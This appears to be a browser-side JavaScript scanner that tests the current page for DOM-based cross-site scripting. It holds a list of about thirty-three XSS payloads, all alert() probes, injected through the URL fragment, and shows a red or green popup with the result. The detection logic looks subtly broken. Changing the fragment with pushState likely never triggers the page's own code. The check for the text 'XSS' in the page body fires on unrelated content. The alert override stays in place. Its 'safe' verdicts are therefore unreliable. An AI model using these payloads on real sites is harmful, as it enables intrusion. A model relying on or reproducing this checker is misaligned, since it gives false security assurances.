let xssPayloads = [
    "<script>alert('XSS')</script>",                     
    "\"><script>alert('XSS')</script>",                  
    "<img src='x' onerror='alert(\"XSS\")'>",            
    "<svg onload='alert(\"XSS\")'>",                     
    "<iframe src='javascript:alert(1)'></iframe>",       
    "<body onload=alert('XSS')>",                        
    "<input type='text' value='<script>alert(1)</script>'>",  
    "<a href='javascript:alert(1)'>Click me</a>",        
    "<embed src='data:text/html,<script>alert(1)</script>'>", 
    "<object data='javascript:alert(1)'></object>",      
    "<svg><script>alert('XSS')</script></svg>",          
    "<math><mi><script>alert('XSS')</script></mi></math>",
    "<link rel='stylesheet' href='javascript:alert(1)'>",
    "<form action='javascript:alert(1)'><input type='submit'></form>",
    "<img src=1 onerror='javascript:alert(1)'>",         
    "<marquee onstart='javascript:alert(1)'>",           
    "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",
    "<svg><a xlink:href='javascript:alert(1)'>Click</a></svg>",
    "javascript:alert(1)",                               
    "onmouseover='alert(1)'",                            
    "<img src='x' style='xss:expression(alert(1))'>",    
    "/*<svg/onload=alert(1)>*/",                         
    "<!--<svg/onload=alert(1)>-->",                      
    "%3Cscript%3Ealert('XSS')%3C/script%3E",             
    "%3Cimg%20src=x%20onerror=alert(1)%3E",              
    "><iframe/src=javascript:alert(1)>",                 
    "'-alert(1)-'",                                      
    "\"-alert(1)-\"",                                    
    "</textarea><script>alert(1)</script>",              
    "\"><img src=x onerror=alert('XSS')>",               
    "<base href='javascript:alert(1)//'>",               
    "<video><source onerror='alert(1)'></video>",        
    "<details open ontoggle=alert(1)>", 
];

// Function to inject payloads and detect XSS
async function checkDomXss() {
    let originalUrl = window.location.href.split("#")[0];  // Save the original URL without any fragments

    for (let payload of xssPayloads) {
        try {
            let alertTriggered = false;
            let domContainsCustomMessage = false;

            // Override alert function to detect if XSS executes
            window.alert = function (message) {
                if (message.includes('XSS')) {  // Look for the specific 'XSS' keyword in the alert
                    alertTriggered = true;
                }
            };

            // Temporarily inject payload into the URL fragment
            let testUrl = originalUrl + "#" + payload;
            window.history.pushState("", "", testUrl);

            // Inject the payload into the DOM and check if it contains the custom message (e.g., 'XSS')
            domContainsCustomMessage = document.body.innerHTML.includes("XSS");

            // Revert the URL back to the original after testing the payload
            window.history.pushState("", "", originalUrl);

            // If any XSS is detected or the custom message is found, stop testing further payloads
            if (alertTriggered || domContainsCustomMessage) {
                return true;  // XSS detected, custom message found
            }
        } catch (error) {
            console.error(`Error testing payload: ${payload}`, error);
        }
    }

    // Ensure the URL is restored to the original after all tests
    window.history.pushState("", "", originalUrl);

    return false;  // No XSS detected or custom message not found
}

// Function to create and show the popup
function showPopup(message, backgroundColor) {
    let popup = document.createElement('div');
    popup.style.position = 'fixed';
    popup.style.top = '10px';
    popup.style.right = '10px';
    popup.style.padding = '15px';
    popup.style.backgroundColor = backgroundColor;
    popup.style.color = 'white';
    popup.style.borderRadius = '5px';
    popup.style.boxShadow = '0 0 10px rgba(0, 0, 0, 0.2)';
    popup.style.zIndex = '10000';
    popup.style.fontSize = '16px';
    popup.style.maxWidth = '300px';
    popup.style.wordWrap = 'break-word';
    popup.innerText = message;

    let closeButton = document.createElement('button');
    closeButton.innerText = 'X';
    closeButton.style.position = 'absolute';
    closeButton.style.top = '5px';
    closeButton.style.right = '10px';
    closeButton.style.border = 'none';
    closeButton.style.backgroundColor = 'transparent';
    closeButton.style.color = 'white';
    closeButton.style.fontSize = '16px';
    closeButton.style.cursor = 'pointer';
    
    closeButton.addEventListener('click', function() {
        popup.remove();
    });

    popup.appendChild(closeButton);
    document.body.appendChild(popup);
}

// Automatically check for DOM-based XSS when the page loads
window.onload = function () {
    checkDomXss().then((xssDetected) => {
        let message = xssDetected ? "⚠️ XSS vulnerability detected!" : "✅ URL is safe from XSS.";
        let backgroundColor = xssDetected ? "red" : "green";
        showPopup(message, backgroundColor);
    });
};
